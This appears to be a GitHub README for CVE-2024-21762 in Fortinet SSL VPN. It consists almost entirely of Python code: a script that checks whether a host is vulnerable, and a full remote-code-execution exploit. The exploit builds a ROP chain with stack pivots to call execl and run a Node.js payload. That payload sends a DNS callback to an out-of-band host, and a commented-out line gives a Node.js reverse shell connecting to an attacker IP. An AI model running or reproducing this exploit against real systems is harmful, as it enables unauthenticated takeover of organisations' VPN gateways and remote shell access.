## Fortinet-SSL-VPN-CVE-2024-21762



## poc
```python
import socket
import ssl
import sys
context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
context.check_hostname=False
context.verify_mode=ssl.CERT_NONE

# should be fine for most hosts, increase this if you're getting errors.
TIMEOUT=5

def send_req(host, req):
    try:
        s=socket.create_connection(host, timeout=5)
    except: return -1
    ss=context.wrap_socket(s)
    ss.send(req)
    try:
        return ss.read(2048)
    except socket.timeout:
        return 0

control_req="""POST /remote/VULNCHECK HTTP/1.1\r
Host: {}\r
Transfer-Encoding: chunked\r
\r
0\r
\r
\r
"""

check_req="""POST /remote/VULNCHECK HTTP/1.1\r
Host: {}\r
Transfer-Encoding: chunked\r
\r
0000000000000000FF\r
\r
"""
def check(host):
    baseurl="https://{}:{}".format(*host)
    r1=send_req(host, control_req.format(baseurl).encode())
    if r1==-1:
        return "Connection Failed"
    if r1==0:
        return "Control request failed"
        return
    if b"HTTP/1.1 403 Forbidden" not in r1:
        print("[warning] Server does not look like a Fortinet SSL VPN interface")
    r2=send_req(host, check_req.format(baseurl).encode())
    if r2==0: return "Vulnerable"
    else: return "Patched"

if __name__=="__main__":
    try:
        host=sys.argv[1]
        port=int(sys.argv[2])
    except:
        print("Usage: check-cve-2024-21762.py <host> <port>")
        exit()
    HOST=(host,port)
    print(check(HOST))
```

```python3 check-cve-2024-21762.py <host> <port>```


## exp
```python
import socket
import time
import argparse


TARGET = 'xxxxxxxxxxxx'  # Target IP
PORT = 443  # Target port, usually 443 for SSL VPN

def make_sock(target, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target, port))
    return sock

def send_payload(payload, target, port):
    with make_sock(target, port) as ssock:
        ssock.sendall(payload)

def main():
    ssl_do_handshake_ptr = b"%60%ce%42%00%00%00%00%00"
    getcwd_ptr = b"%70%62%2c%04%00%00%00%00"

    pivot_1 = b"%52%f7%fd%00%00%00%00%00" # push rdi; pop rsp; ret;
    pivot_2 = b"%ac%c9%ab%02%00%00%00%00" # add rsp, 0x2a0; pop rbx; pop r12; pop rbp; ret;

    rop  = b""
    rop += b"%c6%e2%46%00%00%00%00%00" # push rdi; pop rax; ret;
    rop += b"%19%6f%4d%01%00%00%00%00" # sub rax, 0x2c8; ret;
    rop += b"%8e%b2%fe%01%00%00%00%00" # add rax, 0x10; ret;
    rop += b"%63%db%ae%02%00%00%00%00" # pop rcx; ret;
    rop += b"%00%00%00%00%00%00%00%00" # zero rcx
    rop += b"%38%ad%98%02%00%00%00%00" # or rcx, rax; setne al; movzx eax, al; ret;

    rop += b"%c6%52%86%02%00%00%00%00" # shl rax, 4; add rax, rdx; ret;
    rop += b"%6e%d0%3f%01%00%00%00%00" # or rdx, rcx; ret; - rdx is zero so this is a copy
    rop += b"%a4%df%98%02%00%00%00%00" # sub rdx, rax; mov rax, rdx; ret;

    rop += b"%f5%2c%e6%00%00%00%00%00" #  sub rax, 0x10; ret;
    rop += b"%e4%e6%d7%01%00%00%00%00" #  add rsi, rax; mov [rdi+8], rsi; ret;

    rop += b"%10%1b%0a%01%00%00%00%00" # push rax; pop rdi; add eax, 0x5d5c415b; ret;
    rop += b"%25%0f%8d%02%00%00%00%00" # pop r8; ret; 0x028d0f25
    rop += b"%00%00%00%00%00%00%00%00" # r8

    pivot_3 = b"%e0%3f%4d%02%00%00%00%00" # add rsp, 0xd90; pop rbx; pop r12; pop rbp; ret;

    call_execl = b"%80%c1%43%00%00%00%00%00"

    bin_node = b"/bin/node%00"
    e_flag = b"-e%00"
  ## use this one for rev shell   b'(function(){var net%3drequire("net"),cp%3drequire("child_process"),sh%3dcp.spawn("/bin/node",["-i"]);var client%3dnew net.Socket();client.connect(1337,"xxxxxxxxxxx",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();%00'
    js_payload = b'(function(){var cp=require("child_process");cp.execSync("nslookup xxxxxxxxxxx.oastify.com");})();%00'

    form_value  = b""
    form_value += b"B"*11 + bin_node + b"B"*6 + e_flag + b"B"*14 + js_payload
    form_value += b"B"*438 + pivot_2 + getcwd_ptr
    form_value += b"B"*32 + pivot_1
    form_value += b"B"*168 + call_execl
    form_value += b"B"*432 + ssl_do_handshake_ptr
    form_value += b"B"*32 + rop + pivot_3
    body = (b"B"*1808 + b"=" + form_value + b"&")*20

    data  = b"POST /remote/hostcheck_validate HTTP/1.1\r\n"
    data += b"Host: " + TARGET.encode() + b"\r\n"
    data += b"Content-Length: " + str(len(body)).encode() + b"\r\n"
    data += b"\r\n"
    data += body

    send_payload(data, TARGET, PORT)

    # Short delay to ensure the server processes the first request
    time.sleep(2)

    # Preparing and sending the second part of the exploit
    data  = b"POST / HTTP/1.1\r\n"
    data += b"Host: " + TARGET.encode() + b"\r\n"
    data += b"Transfer-Encoding: chunked\r\n"
    data += b"\r\n"
    data += b"0"*4137 + b"\0"
    data += b"A"*1 + b"\r\n\r\n"

    send_payload(data, TARGET, PORT)

if __name__ == "__main__":
    main()
```

